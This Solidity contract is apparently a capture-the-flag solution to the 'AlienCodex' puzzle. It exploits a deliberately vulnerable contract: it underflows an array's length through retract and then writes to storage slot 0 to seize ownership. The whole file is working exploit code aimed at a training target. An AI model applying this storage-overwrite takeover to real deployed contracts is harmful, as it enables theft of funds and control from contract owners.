// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IAlienCodex.sol";

contract AlienCodexAttack {
    function attack(IAlienCodex target) external {
        target.make_contact();

        require(target.contact(), "AlienCodex: Wrong res");

        target.retract();

        target.revise(
            type(uint256).max - uint256(keccak256(abi.encode(uint32(1)))) + 1,
            bytes32(bytes20(msg.sender)) >> (8 * 12)
        );

        require(msg.sender == target.owner(), "AlienCodex: Attack failed");
    }
}
